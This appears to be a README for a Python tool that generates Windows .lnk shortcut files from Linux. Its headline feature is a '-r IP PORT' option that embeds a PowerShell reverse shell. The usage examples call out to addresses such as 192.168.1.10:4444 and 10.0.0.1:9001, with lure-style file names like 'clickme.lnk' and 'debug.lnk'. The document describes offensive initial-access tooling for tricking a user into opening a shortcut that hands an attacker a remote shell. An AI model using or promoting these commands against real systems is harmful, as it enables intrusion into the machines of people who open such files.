# .lnk File Generator

Generate Windows shortcut files (.lnk) from Linux.

## Usage

### Command line
```bash
python3 lnk_generator.py -r 192.168.1.10 4444 # Reverse Shell
python3 lnk_generator.py -c "ping 8.8.8.8"
python3 lnk_generator.py -c "calc.exe" -o calculator.lnk
```

### Interactive mode
```bash
python3 lnk_generator.py --interactive
```

## Options

| Option | Description |
|--------|-------------|
| `-c, --command` | Command to execute |
| `-r, --reverse IP PORT` | Generate PowerShell reverse shell |
| `-o, --output` | Output filename (default: clickme.lnk) |
| `--type` | Shortcut type: powershell/cmd/custom |
| `--desc` | Shortcut description |
| `-i, --interactive` | Force interactive mode |
| `-v, --verbose` | Verbose output |

## Examples

```bash
# Interactive mode (guided setup)
python3 lnk_generator.py -i
# PowerShell command
python3 lnk_generator.py -c "Get-Process"

# Reverse shell
python3 lnk_generator.py -r 192.168.1.10 4444 # Reverse Shell

# Reverse shell with custom filename
python3 lnk_generator.py -r 10.0.0.1 9001 -o debug.lnk

# CMD command  
python3 lnk_generator.py -c "dir" --type cmd

# Custom executable
python3 lnk_generator.py -c "C:\\Windows\\System32\\calc.exe" --type custom
```

## Requirements

- Python 3.6+
- Linux environment

## Files

- `lnk_generator.py` - Main interface
- `native_lnk_generator.py` - Core generator
- `template.lnk` - Windows template file
